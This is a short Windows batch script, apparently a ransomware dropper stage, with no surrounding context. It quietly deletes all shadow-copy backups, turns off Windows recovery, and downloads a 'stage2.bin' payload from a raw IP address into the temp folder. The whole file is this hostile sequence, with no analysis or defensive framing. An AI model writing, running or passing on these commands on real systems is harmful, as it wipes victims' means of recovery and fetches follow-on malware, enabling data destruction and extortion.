@echo off
vssadmin Delete Shadows /all /quiet
bcdedit /set {default} recoveryenabled No
curl http://203.0.113.16/stage2.bin -o %TEMP%\stage2.bin
